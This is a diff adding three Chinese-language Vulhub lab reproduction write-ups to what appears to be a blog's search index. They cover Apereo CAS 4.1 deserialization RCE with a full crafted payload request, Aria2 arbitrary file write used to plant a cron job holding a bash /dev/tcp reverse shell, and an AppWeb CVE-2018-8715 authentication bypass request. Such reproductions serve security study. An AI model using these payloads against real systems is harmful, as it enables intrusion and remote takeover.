@@ -1821,4 +1821,114 @@
         <tag>python</tag>
       </tags>
   </entry>
+  <entry>
+    <title>Apereo CAS 4.1反序列化RCE漏洞</title>
+    <url>/2021/05/01/Apereo%20CAS%204.1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96RCE%E6%BC%8F%E6%B4%9E/</url>
+    <content><![CDATA[<h1 id="Apereo-CAS-4-1反序列化RCE漏洞"><a href="#Apereo-CAS-4-1反序列化RCE漏洞" class="headerlink" title="Apereo CAS 4.1反序列化RCE漏洞"></a>Apereo CAS 4.1反序列化RCE漏洞</h1><p>Apereo CAS是企业单点登录系统。CAS尝试通过Apache Commons Collections库对对象进行反序列化的过程中存在一个问题，这种情况引起了RCE漏洞。</p>
+<a id="more"></a>
+
+<p>参考：</p>
+<ul>
+<li><a href="https://apereo.github.io/2016/04/08/commonsvulndisc/" target="_blank" rel="noopener">https://apereo.github.io/2016/04/08/commonsvulndisc/</a></li>
+</ul>
+<p>启动Apereo CAS后，请访问<code>http://192.168.44.132:8080/cas/login</code>以查看登录页面。</p>
+<h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><p>4.1.7之前的Apereo CAS的现成默认配置使用默认密钥<code>changeit</code>：</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">EncryptedTranscoder</span> <span class="keyword">implements</span> <span class="title">Transcoder</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> CipherBean cipherBean;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">boolean</span> compression = <span class="keyword">true</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">EncryptedTranscoder</span><span class="params">()</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        BufferedBlockCipherBean bufferedBlockCipherBean = <span class="keyword">new</span> BufferedBlockCipherBean();</span><br><span class="line">        bufferedBlockCipherBean.setBlockCipherSpec(<span class="keyword">new</span> BufferedBlockCipherSpec(<span class="string">"AES"</span>, <span class="string">"CBC"</span>, <span class="string">"PKCS7"</span>));</span><br><span class="line">        bufferedBlockCipherBean.setKeyStore(<span class="keyword">this</span>.createAndPrepareKeyStore());</span><br><span class="line">        bufferedBlockCipherBean.setKeyAlias(<span class="string">"aes128"</span>);</span><br><span class="line">        bufferedBlockCipherBean.setKeyPassword(<span class="string">"changeit"</span>);</span><br><span class="line">        bufferedBlockCipherBean.setNonce(<span class="keyword">new</span> RBGNonce());</span><br><span class="line">        <span class="keyword">this</span>.setCipherBean(bufferedBlockCipherBean);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ...</span></span><br></pre></td></tr></table></figure>
+
+<p>可以尝试使用<a href="https://github.com/vulhub/Apereo-CAS-Attack" target="_blank" rel="noopener">Apereo-CAS-Attack</a>生成加密的<a href="https://github.com/frohoff/ysoserial" target="_blank" rel="noopener">ysoserial</a>的序列化对象：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">java -jar apereo-cas-attack-1.0-SNAPSHOT-all.jar CommonsCollections4 &quot;touch &#x2F;tmp&#x2F;success&quot;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://image.3001.net/images/20210507/16203508382075.png" alt="image-20210506171620911"></p>
+<p>然后，从登录操作中拦截并修改http请求<code>/cas/login</code>，将有效负载放入<code>execution</code>的值中：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F;cas&#x2F;login HTTP&#x2F;1.1</span><br><span class="line">Host: 192.168.44.132:8080</span><br><span class="line">Content-Length: 2290</span><br><span class="line">Cache-Control: max-age&#x3D;0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Origin: http:&#x2F;&#x2F;192.168.44.132:8080</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;90.0.4430.93 Safari&#x2F;537.36</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9</span><br><span class="line">Referer: http:&#x2F;&#x2F;192.168.44.132:8080&#x2F;cas&#x2F;login</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.9</span><br><span class="line">Cookie: JSESSIONID&#x3D;504D29BC1AC0C627D269FD50E48691C1</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">username&#x3D;test&amp;password&#x3D;testt&amp;lt&#x3D;LT-3-Kz6ZfST1l90TARv9DrSGdo6PjgdUoT-cas01.example.org&amp;execution&#x3D;e7dd4974-27ab-4052-a7fb-bd85e6c2fbe5_AAAAIgAAABCUJFoJfNGzFhudnZYMaIgIAAAABmFlczEyOEdb%2BTkE7I%2BXg2A5D9zQX%2FJZTxymRFgtso29ahEkVPD0AKqLhf5uS0H47YF3p5CAuWvOX5XCRNutljiJsL%2BWfwx0ObeDfdR0Y6%2BvsPqXHe7mg0ID5fuv%2BhHFdlygzW%2FLWUWQVWYSMb8EP0EtMJBGDggopCDlhkrcETOjMSJjrb1lhZUqW%2B2yYr%2Fgl2GhrEWNqFgY2CIcAV0WDeU7uO%2BGyOFcf1szw1L9bs02ySMpr%2FsGdUERI3cbrj71lRchvpQPmTCVsZEuzrdPCgiZ8xKyc8LCQ0Rcp%2F10xBGy5ViXTkhDF9kpdQd1KComTBmsr5t1JSSRPfXsIIXS3uXt76ahmlq%2F4inUq%2BH7rhyqAMdq9KUfHMkgmetc0fOOgWK2yzmWO2mdwvSpA94rAKJlUJBaQa%2BEBA4vTY5O16g8ndIFixmOmcJJZ9u%2B5nfNx2Y8HQRiWdfgWKSbLZ%2BsxCKIbFcTq5jWMgwGXnc7vphGmX9E1jFNP0EuzK%2BlhB8dBHrzyHD3fOB5t7z42kjeB9sHl0XP94dGdyvKxxgV4x1hh2Xv7rx6s%2F%2FhqrpvaRsw4V228UWIcsGUXa2rUsgBg7UUQ3KDkg4smdmOiUZBXrYJ409F42F03lNaI26IoTexHJz%2B4NZNjUiNqm%2BSovwiE%2FK%2FGwm4Xehz5EfhB1B8QQh5f91opk7m1Bm8X6RlStF4lcFl7k8cHt%2FJUtU03ohAVRdWLm4jnTw55S%2B8TFakRzyvuuPRbgLTbx3usYqlj4Y5ysiBwfAI3wRW8RJKkwzFwxsH9d1wC8THxDq76eR1l44sa39PaogS94ZNQVr%2FOc0W7s8hpkYQa79UkJjvUPt%2FeRPeikskrby4uW2DS19F%2BHlBhTUZhFXxIIZf5%2FzV3H1Ph80yJKRnsU6bhlUDAslC%2BM2hll4z9ow8xcZ4LZWpjkCSL3H%2BTExZ0w3eaw%2FKasAM7NEO4sW9aO46wzNarlsaZP657jS2dFL%2BR0W858gwWKx2nUuCWEuKNAw0wkSlxUqQTFjy62FPyXjSHa0hcs67L80dkAB5praeNNDOOAhhfoTaIn6sEBho4sXtBFJtz%2FvY%2F9ELtpKcHGEXYzSHeQhMc9kie%2BqqDHHIh43mkPEk0O5DHszL5dS62AbtiF%2B1YQMySsFzGLzxLLY3Ru5P7v52Fup7HpmyiCSfX0PAvwuy0JQtt9OhpFYFzJyHyT%2FOVHk25kEmDeOwa5A9%2FEQ8ZhLaWLV7X0FCRSmMr2zPWivDNyQMWwCsFjif52o%2ByTdX5Ta0oHXBfNHwRV3MsF9KGVqKDl%2Bkbj1N3ztLIzw2wUdT5Yk0FKNpGJdVaosWD5gUwCijk7MAbXQSWoH4q98QWquTPTwFX80kLu%2F1wDSZpELnMAutggEqzsi99RKNbTbWJZoPcPtRjrCQfYCOIB3GGOIlYWM9XOdndM%2FCo7aJDPwJD1GSXG9Oxw8a1G789moUXzc31IGkd8a3tQxQD64N7PhnJ80PrqxD%2FnNyVmTqmN2eFJREsvSkf3KUi85p%2BH5zvK4hmYq6mGuXO8fyHmmIG%2Fl%2Fm2ARx1zPIAJkc%2BkugkY3QOr5MDYY9j%2FCjgsQ3IfWRF2tvIm4b9wv0QQnQNikUcTLBVmEE%2FrXhCYXUtFhk90eyqk%2BI%2FAXtlwyE%2F8Y8d6TpjkxQljd5enhRh38xeXPzSwJXHiPPZNf5%2F8RkFP3r0FbVbllIrV5za6qYHkq3rE%2BcRQEBBJtFr0sAo1Qvaer0ar2nTtKPrGgxfajlM7N0BDS9FZg6BoQvQRCeG3peYWbWLghXlKXHGDHtYsntzZTXLFMZVdjwhs9nxSv9qyFPkA1Fwh6ZcwsPQSzZTo2%2Fy3VwD3nwlW%2BLaRjzlwjZeIJk0iJ15x8ijObD%2F86tzlCNm1Bo8Y11Bwo%2BKPVX5VYuGvEXXdtQbI8sCTET4vTPzR2JgzMf0VKLhKF9fMKWkpPONcXicN1jqAkhYGS&amp;_eventId&#x3D;submit&amp;submit&#x3D;LOGIN</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://image.3001.net/images/20210507/16203508432732.png" alt="image-20210506173344081"></p>
+<p><code>touch /tmp/success</code>已成功执行：</p>
+<p><img src="https://image.3001.net/images/20210507/16203508478955.png" alt="image-20210506173847082"></p>
+]]></content>
+      <categories>
+        <category>漏洞复现</category>
+      </categories>
+      <tags>
+        <tag>Vulhub复现</tag>
+        <tag>Apereo CAS</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Aria2任意文件写入漏洞</title>
+    <url>/2021/05/07/Aria2%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5%E6%BC%8F%E6%B4%9E/</url>
+    <content><![CDATA[<h1 id="Aria2任意文件写入漏洞"><a href="#Aria2任意文件写入漏洞" class="headerlink" title="Aria2任意文件写入漏洞"></a>Aria2任意文件写入漏洞</h1><a id="more"></a>
+
+<p>Aria2是具有内置XML-RPC和JSON-RPC接口的轻型，多协议，多源下载工具（支持HTTP / HTTPS，FTP，BitTorrent，Metalink）。</p>
+<p>我们可以使用RPC接口操作aria2并将文件下载到任何目录，从而导致任意文件写入漏洞。</p>
+<p>参考文章：</p>
+<ul>
+<li><a href="https://paper.seebug.org/120/" target="_blank" rel="noopener">https://paper.seebug.org/120/</a></li>
+</ul>
+<p>6800是aria2的rpc服务的默认端口。启动环境后，访问<code>http://192.168.44.132:6800/</code>，该服务应返回404页面。</p>
+<h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><p>由于rpc通信需要json或xml，因此不方便，因此我们可以使用第三方UI与目标进行通信，例如<a href="http://binux.github.io/yaaw/demo/" target="_blank" rel="noopener">http://binux.github.io/yaaw/demo/</a></p>
+<p>打开yaaw，单击配置按钮，然后填写运行aria2：的目标域名<code>http://192.168.44.132:6800/jsonrpc</code>：</p>
+<p><img src="https://image.3001.net/images/20210507/16203724065182.png" alt="image-20210507141248015"></p>
+<p>然后单击“添加+”以添加新的下载任务。在“目录”（Dir）字段中填写要下载文件的目录，并在“文件名”（File Name）字段中填写所需的文件名。例如，我们将通过编写crond任务来下载反向外壳程序：</p>
+<p><img src="https://image.3001.net/images/20210507/16203724093869.png" alt="image-20210507142313216"></p>
+<p>shell文件，末尾需要一个换行符：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#!&#x2F;bin&#x2F;bash </span><br><span class="line">&#x2F;bin&#x2F;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.44.1&#x2F;4444 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
+
+<p>此时，arai2会将恶意文件（您指定的URL）下载到/etc/cron.d/目录中，文件名为“ shell”。在debian中，/ etc / cron.d目录中的所有文件都将作为计划任务配置文件（如crontab）读取。编写完成后，我们必须等待一分钟，然后执行反向Shell脚本：</p>
+<p><img src="https://image.3001.net/images/20210507/16203724165984.png" alt="image-20210507145553962"></p>
+<p>可以看到上传成功了。</p>
+<blockquote>
+<p>如果反向Shell不成功，请注意crontab文件的格式，并且换行符必须为<code>\n</code>，并且在文件末尾需要换行符。</p>
+</blockquote>
+<p>反弹shell成功，</p>
+<p><img src="https://image.3001.net/images/20210507/16203724192538.png" alt="image-20210507151842393"></p>
+<p>注意一点，shell脚本执行报“/bin/bash^M: bad interpreter: No such file or directory”这样的错，是因为在执行shell脚本时提示这样的错误主要是由于shell脚本文件是dos格式，即每一行结尾以\r\n来标识，而unix格式的文件行尾则以\n来标识。</p>
+<p>查看脚本文件是dos格式还是unix格式的几种办法。<br>（1）cat -A filename  从显示结果可以判断，dos格式的文件行尾为^M$，unix格式的文件行尾为$。<br>（2）od -t x1 filename 如果看到输出内容中存在0d 0a的字符，那么文件是dos格式，如果只有0a，则是unix格式。<br>（3）vi filename打开文件，执行 : set ff，如果文件为dos格式在显示为fileformat=dos，如果是unxi则显示为fileformat=unix。</p>
+<p>  解决方法：<br>（1）使用linux命令dos2unix filename，直接把文件转换为unix格式<br>（2）使用sed命令sed -i “s/\r//“ filename  或者 sed -i “s/^M//“ filename直接替换结尾符为unix格式<br>（3）vi filename打开文件，执行 : set ff=unix 设置文件为unix，然后执行:wq，保存成unix格式。</p>
+]]></content>
+      <categories>
+        <category>漏洞复现</category>
+      </categories>
+      <tags>
+        <tag>Vulhub复现</tag>
+        <tag>Aria2</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>AppWeb身份验证绕过漏洞（CVE-2018-8715）</title>
+    <url>/2021/05/06/AppWeb%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2018-8715%EF%BC%89/</url>
+    <content><![CDATA[<h1 id="AppWeb身份验证绕过漏洞（CVE-2018-8715）"><a href="#AppWeb身份验证绕过漏洞（CVE-2018-8715）" class="headerlink" title="AppWeb身份验证绕过漏洞（CVE-2018-8715）"></a>AppWeb身份验证绕过漏洞（CVE-2018-8715）</h1><a id="more"></a>
+
+<p>AppWeb是基于Embedthis Software LLC开发和维护的开源GPL协议的嵌入式Web服务器。它是用C / C ++编写的，几乎可以在任何现代操作系统上运行。当然，它旨在为嵌入式设备提供Web应用程序容器。</p>
+<p>可以配置AppWeb进行身份验证，其中包括以下三种身份验证方法：</p>
+<ul>
+<li><code>basic</code>，传统的HTTP基本身份验证</li>
+<li><code>digest</code>，改进了HTTP基本身份验证。在这种模式下，Cookie将用于身份验证，而不是<code>Authorization</code>标头。</li>
+<li><code>form</code>，基于HTML的表单身份验证</li>
+</ul>
+<p>在7.0.3之前的Appweb版本中，存在与authCondition函数相关的逻辑缺陷<code>http/httpLib.c</code>。使用伪造的HTTP请求，可以绕过<code>form</code>和<code>digest</code>登录类型的身份验证。</p>
+<p>参考链接：</p>
+<ul>
+<li><a href="https://ssd-disclosure.com/index.php/archives/3676" target="_blank" rel="noopener">https://ssd-disclosure.com/index.php/archives/3676</a></li>
+</ul>
+<h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><p>访问<code>http://192.168.44.132:8080/</code>，出现登陆框提示需要登录，删除凭证后，放包可发现存在管理员的session值直接响应包返回，利用该漏洞需要知道一个已存在的用户名，当前的用户名是<code>admin</code>，因此您可以使用以下请求绕过身份验证：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">GET &#x2F; HTTP&#x2F;1.1</span><br><span class="line">Host: 192.168.44.132:8080</span><br><span class="line">Cache-Control: max-age&#x3D;0</span><br><span class="line">Authorization: Digest username&#x3D;&quot;admin&quot;</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;90.0.4430.93 Safari&#x2F;537.36</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.9</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure>
+
+<p>由于我们没有传递密码字段，因此服务器错误发生，其中包含<code>200 status code</code>和会话设置标头：</p>
+<p><img src="https://image.3001.net/images/20210507/16203566614610.png" alt="image-20210507104525967"></p>
+<p>可以使用以下会话标头正常访问该页面：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-http-session-&#x3D;7::http.session::665137a0fea794484d8c255fa9f8f683</span><br></pre></td></tr></table></figure>
+
+<p>在将session添加到请求包内，以POST的方式发送，然后这样就可以直接访问该管理员才能访问的界面了。</p>
+<p><img src="https://image.3001.net/images/20210507/16203566642567.png" alt="image-20210507104657138"></p>
+]]></content>
+      <categories>
+        <category>漏洞复现</category>
+      </categories>
+      <tags>
+        <tag>Vulhub复现</tag>
+        <tag>AppWeb</tag>
+        <tag>CVE-2018-8715</tag>
+      </tags>
+  </entry>
 </search>
